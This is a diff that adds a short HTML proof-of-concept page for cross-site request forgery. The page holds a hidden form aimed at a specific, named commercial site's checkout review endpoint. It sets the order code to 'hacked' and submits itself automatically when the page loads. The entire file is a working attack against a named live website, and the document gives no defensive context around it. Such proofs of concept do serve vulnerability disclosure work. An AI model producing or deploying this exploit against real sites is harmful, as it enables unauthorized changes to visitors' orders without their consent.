@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF PoC – Change Order Code</title>
+</head>
+<body>
+  <form id="csrfForm" action="https://www.familyhomeplans.com/checkout/review.cfm" method="POST">
+    <!-- These hidden inputs replicate exactly what the legitimate form sends -->
+    <input type="hidden" name="OrderCode"   value="hacked">
+    <input type="hidden" name="PromoCode"   value="">
+    <input type="hidden" name="saveordercode" value="1">
+  </form>
+
+  <script>
+    // Immediately submit when the page loads
+    document.getElementById('csrfForm').submit();
+  </script>
+</body>
+</html>
